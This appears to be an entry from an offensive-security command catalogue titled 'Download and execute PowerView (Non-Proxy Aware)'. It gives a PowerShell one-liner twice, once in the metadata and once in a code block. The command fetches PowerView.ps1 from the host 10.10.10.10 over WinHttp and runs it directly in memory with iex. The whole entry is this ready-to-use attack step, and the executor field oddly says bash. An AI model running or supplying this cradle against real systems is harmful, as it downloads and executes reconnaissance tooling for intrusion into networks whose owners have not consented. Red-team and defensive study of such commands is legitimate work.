---
id: 86c099e7-19fa-41a0-927a-15cde0575ae1
name: Download and execute PowerView (Non-Proxy Aware)
type: command
executor: bash
data: $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.10.10/PowerView.ps1',$false);$h.send();iex
  $h.responseText
output: null
created_at: '2023-04-06T03:56:24.056069+00:00'
updated_at: '2023-04-10T20:37:01.110401+00:00'
---

# Download and execute PowerView (Non-Proxy Aware)

```bash
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.10.10/PowerView.ps1',$false);$h.send();iex $h.responseText
```
